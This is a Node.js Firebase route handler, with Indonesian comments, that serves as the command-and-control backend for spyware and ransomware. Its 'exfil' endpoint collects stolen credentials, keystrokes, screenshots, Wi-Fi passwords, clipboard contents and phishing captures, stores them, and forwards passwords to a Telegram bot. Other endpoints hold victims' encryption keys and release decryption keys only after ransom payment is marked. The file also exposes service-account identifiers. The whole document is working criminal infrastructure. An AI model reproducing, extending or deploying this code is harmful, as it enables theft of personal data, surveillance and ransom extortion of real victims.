const admin = require('firebase-admin');
const crypto = require('crypto');

// ========== FIREBASE CONFIG ==========
// GANTI dengan service account kamu
const serviceAccount = {
  "type": "service_account",
  "project_id": "bom-kaoskaki-db",
  "private_key_id": "418557051fa3a10205323470cb2fd7e448af6353",
  "private_key": process.env.FIREBASE_PRIVATE_KEY ? process.env.FIREBASE_PRIVATE_KEY.replace(/\\\\n/g, '\\n') : "-----BEGIN PRIVATE KEY-----\\nYOUR_PRIVATE_KEY_HERE\\n-----END PRIVATE KEY-----\\n",
  "client_email": "firebase-adminsdk-fbsvc@bom-kaoskaki-db.iam.gserviceaccount.com",
  "client_id": "115575027255595530608",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40bom-kaoskaki-db.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

// ========== TELEGRAM CONFIG ==========
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

// ========== INIT ==========
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();

// ========== HELPER FUNCTIONS ==========
function b64(str) { return Buffer.from(str).toString('base64'); }
function ub64(str) { return Buffer.from(str, 'base64').toString('utf8'); }

async function sendTelegram(msg) {
    try {
        const fetch = require('node-fetch');
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
        });
    } catch (e) { /* silently fail */ }
}

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.headers['x-real-ip'] ||
        req.connection?.remoteAddress || 'unknown';
}

// ========== ROUTE HANDLER ==========
module.exports = async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') return res.status(200).end();

    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname.replace('/api/', '');
    const ip = getClientIP(req);

    try {
        // ========== C2 HEARTBEAT / EXFIL ==========
        if (req.method === 'POST' && path === 'exfil') {
            const { type, data, session_id } = req.body || {};
            const sid = session_id || `SESS-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`;

            // Create/update session
            const sessionRef = db.collection('sessions').doc(sid);
            const sessionDoc = await sessionRef.get();

            if (!sessionDoc.exists) {
                await sessionRef.set({
                    session_id: sid,
                    first_seen: admin.firestore.FieldValue.serverTimestamp(),
                    last_seen: admin.firestore.FieldValue.serverTimestamp(),
                    ip: ip,
                    user_agent: req.headers['user-agent'] || 'unknown',
                    hostname: data?.hostname || 'unknown',
                    username: data?.username || 'unknown',
                    os: data?.os || 'unknown',
                    is_paid: false,
                    status: 'active'
                });

                await sendTelegram(
                    `🔴 <b>NEW SESSION</b>\n` +
                    `ID: <code>${sid}</code>\n` +
                    `Host: ${data?.hostname || '?'}\n` +
                    `User: ${data?.username || '?'}\n` +
                    `IP: ${ip}\n` +
                    `OS: ${data?.os || '?'}`
                );
            } else {
                await sessionRef.update({
                    last_seen: admin.firestore.FieldValue.serverTimestamp(),
                    ip: ip
                });
            }

            // Route data to correct collection
            if (type === 'system_info' || type === 'spyware') {
                await db.collection('exfil_data').add({
                    session_id: sid, type, data, ip,
                    timestamp: admin.firestore.FieldValue.serverTimestamp()
                });
            }
            else if (type === 'credentials') {
                await db.collection('credentials').add({
                    session_id: sid, data, ip,
                    timestamp: admin.firestore.FieldValue.serverTimestamp()
                });
                const creds = Array.isArray(data) ? data : [data];
                for (const c of creds) {
                    await sendTelegram(
                        `🔑 <b>CREDENTIAL CAPTURED</b>\n` +
                        `Session: <code>${sid}</code>\n` +
                        `URL: ${c.url || c.origin || '?'}\n` +
                        `User: ${c.username || c.email || '?'}\n` +
                        `Pass: <code>${c.password || '?'}</code>`
                    );
                }
            }
            else if (type === 'keylogger') {
                await db.collection('keylogger').add({
                    session_id: sid, data, ip,
                    timestamp: admin.firestore.FieldValue.serverTimestamp()
                });
            }
            else if (type === 'screenshot') {
                await db.collection('screenshots').add({
                    session_id: sid, data, ip,
                    timestamp: admin.firestore.FieldValue.serverTimestamp()
                });
            }
            else if (type === 'wifi') {
                await db.collection('wifi').add({
                    session_id: sid, data, ip,
                    timestamp: admin.firestore.FieldValue.serverTimestamp()
                });
                const profiles = Array.isArray(data) ? data : [data];
                for (const w of profiles) {
                    await sendTelegram(
                        `📶 <b>WIFI CREDENTIAL</b>\n` +
                        `SSID: ${w.ssid || '?'}\n` +
                        `Pass: <code>w.password || '?'</code>`
                    );
                }
            }
            else if (type === 'clipboard') {
                await db.collection('clipboard').add({
                    session_id: sid, data, ip,
                    timestamp: admin.firestore.FieldValue.serverTimestamp()
                });
                if (data?.content?.length > 10) {
                    await sendTelegram(
                        `📋 <b>CLIPBOARD</b>\n` +
                        `Session: <code>${sid}</code>\n` +
                        `Content: ${data.content.substring(0, 200)}`
                    );
                }
            }
            else if (type === 'phishing') {
                await db.collection('phishing').add({
                    session_id: sid, data, ip,
                    timestamp: admin.firestore.FieldValue.serverTimestamp()
                });
                await sendTelegram(
                    `🎣 <b>PHISHING CREDENTIAL</b>\n` +
                    `User: ${data?.username || '?'}\n` +
                    `Pass: <code>${data?.password || '?'}</code>`
                );
            }
            else if (type === 'heartbeat') {
                await sessionRef.update({
                    last_seen: admin.firestore.FieldValue.serverTimestamp()
                });
            }

            return res.status(200).json({ status: 'ok', session_id: sid });
        }

        // ========== CHECK DECRYPT STATUS ==========
        else if (req.method === 'GET' && path === 'check_decrypt') {
            const machine_id = req.query.machine_id;
            if (!machine_id) return res.status(400).json({ error: 'machine_id required' });

            const snap = await db.collection('sessions')
                .where('machine_id', '==', machine_id)
                .where('is_paid', '==', true)
                .limit(1)
                .get();

            const canDecrypt = !snap.empty;
            return res.json({ can_decrypt: canDecrypt });
        }

        // ========== GET PRIVATE KEY ==========
        else if (req.method === 'GET' && path === 'get_private_key') {
            const machine_id = req.query.machine_id;
            if (!machine_id) return res.status(400).json({ error: 'machine_id required' });

            const snap = await db.collection('sessions')
                .where('machine_id', '==', machine_id)
                .where('is_paid', '==', true)
                .limit(1)
                .get();

            if (snap.empty) return res.status(403).json({ error: 'Not paid' });

            const doc = snap.docs[0];
            const privateKey = doc.data().private_key;
            return res.json({ private_key: privateKey });
        }

        // ========== DECRYPT KEY (SAVE RSA ENC KEY) ==========
        else if (req.method === 'POST' && path === 'decrypt_key') {
            const { machine_id, encrypted_key } = req.body;
            if (!machine_id || !encrypted_key) return res.status(400).json({ error: 'missing fields' });

            await db.collection('ransom_keys').add({
                machine_id, encrypted_key,
                timestamp: admin.firestore.FieldValue.serverTimestamp()
            });

            return res.json({ status: 'ok' });
        }

        // ========== SESSIONS LIST ==========
        else if (req.method === 'GET' && path === 'sessions') {
            const snap = await db.collection('sessions').orderBy('last_seen', 'desc').limit(100).get();
            const sessions = [];
            snap.forEach(d => sessions.push({ id: d.id, ...d.data() }));
            return res.json(sessions);
        }

        // ========== PAY / MARK PAID ==========
        else if (req.method === 'POST' && path === 'pay') {
            const { session_id, private_key } = req.body;
            if (!session_id) return res.status(400).json({ error: 'session_id required' });

            await db.collection('sessions').doc(session_id).update({
                is_paid: true,
                paid_at: admin.firestore.FieldValue.serverTimestamp(),
                private_key: private_key || null
            });

            await sendTelegram(`✅ <b>PAYMENT MARKED</b>\nSession: <code>${session_id}</code>\nPrivate key stored.`);
            return res.json({ status: 'ok' });
        }

        // ========== GET DATA FOR DASHBOARD ==========
        else if (req.method === 'GET' && path === 'dashboard_data') {
            const [sessionsSnap, credsSnap, keySnap, wifiSnap] = await Promise.all([
                db.collection('sessions').orderBy('last_seen', 'desc').limit(50).get(),
                db.collection('credentials').orderBy('timestamp', 'desc').limit(100).get(),
                db.collection('keylogger').orderBy('timestamp', 'desc').limit(100).get(),
                db.collection('wifi').orderBy('timestamp', 'desc').limit(50).get()
            ]);

            const sessions = []; sessionsSnap.forEach(d => sessions.push({ id: d.id, ...d.data() }));
            const credentials = []; credsSnap.forEach(d => credentials.push({ id: d.id, ...d.data() }));
            const keylogs = []; keySnap.forEach(d => keylogs.push({ id: d.id, ...d.data() }));
            const wifi = []; wifiSnap.forEach(d => wifi.push({ id: d.id, ...d.data() }));

            return res.json({ sessions, credentials, keylogs, wifi });
        }

        // ========== FILE NOT FOUND ==========
        else {
            return res.status(404).json({ error: 'Not found' });
        }

    } catch (err) {
        console.error('Error:', err);
        return res.status(500).json({ error: err.message });
    }
};